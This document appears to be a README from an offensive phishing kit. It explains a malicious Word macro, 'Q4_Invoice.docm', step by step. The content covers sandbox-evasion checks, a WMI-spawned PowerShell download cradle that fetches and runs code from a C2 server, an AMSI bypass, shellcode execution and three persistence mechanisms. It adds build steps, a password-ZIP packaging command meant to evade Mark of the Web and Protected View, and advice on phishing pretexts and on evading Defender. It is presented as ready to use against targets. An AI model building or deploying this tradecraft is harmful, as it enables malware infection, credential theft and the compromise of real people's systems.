# DOC Vector — Office Macro Phishing

> **End-to-end build:** see [`../BUILD.md`](../BUILD.md) for the full
> walkthrough from clone to armed, tested payload.

## Files

- `q4_invoice.vba` — the VBA module. Contains the auto-execute entry points
  (`Document_Open` and `AutoOpen`), the de-chained PowerShell cradle, and the
  three persistence routines.
- `q4_invoice_body.md` — the document body. Plain boilerplate; the social
  engineering lives in the phishing email, not the document itself.

## How it works

1. User opens `Q4_Invoice.docm` and clicks "Enable Content."
2. `Document_Open` → `MyMacro` runs.
3. Emulator check: `Sleep(2000)` + wall-clock delta. Bails if the delay was
   fast-forwarded (indicating an AV sandbox).
4. WMI `Win32_Process.Create` spawns PowerShell as a child of `WmiPrvSE.exe`,
   not of `WINWORD.EXE`. Behavioral detection aimed at "Office spawning
   PowerShell" is bypassed.
5. PowerShell `IEX` downloads `run.txt` from the C2 and executes it. That
   script contains the AMSI bypass and the reflective shellcode runner.
6. Three persistence mechanisms are installed for redundancy.

## Why no shellcode in the macro

If shellcode lived in the document, every re-generation of the payload would
require re-delivering the phishing email. Keeping it external means the
document's signature profile stays constant while the shellcode changes
underneath it.

## Build steps

1. On a machine with Word and pandoc:

       pandoc q4_invoice_body.md -o Q4_Invoice.docx

2. Open `Q4_Invoice.docx` in Word.
3. Press Alt+F11 to open the VBA editor.
4. Insert → Module → paste the contents of `q4_invoice.vba`.
5. File → Save As → Word Macro-Enabled Document (*.docm) → `Q4_Invoice.docm`.
6. Close and reopen the file to confirm the macro persists and the security
   warning appears as expected.

**Important:** `PersistScheduledTask` writes a placeholder string for the
poller body. Replace it with the contents of `../shared/activate_poller.ps1`
before saving the `.docm`. See `../BUILD.md` Step 3c.

## Packaging for delivery

Deliver inside a password-protected ZIP. Mark of the Web does not propagate
through encrypted archives in most extraction tools, which means Protected
View will not fire on the extracted `.docm`.

    7z a -p"invoice2024" -mhe=on -tzip Q4_Invoice.zip Q4_Invoice.docm

Include the password in the phishing email as if it were a normal policy
measure. This pattern is used by real-world campaigns and does not raise
suspicion when the pretext supports it.

## Delivery notes

- The email should be plain-text or minimal HTML — no tracking pixels, no
  external images. Defender flags those.
- Pretexts that work well: PTO policy update, vendor invoice, IT maintenance
  notice, benefits enrollment.
- If the target uses Office 2021 or Office 365, macros are blocked by default
  even after Protected View is dismissed. The PDF vector is a better fit for
  those environments.

## Related

- `../BUILD.md` — end-to-end walkthrough
- `../shared/run_txt_recipe.md` — generating the external shellcode runner
- `../shared/activate_poller.ps1` — the on-demand callback poller
- `../shared/handler.rc` — Metasploit handler configuration
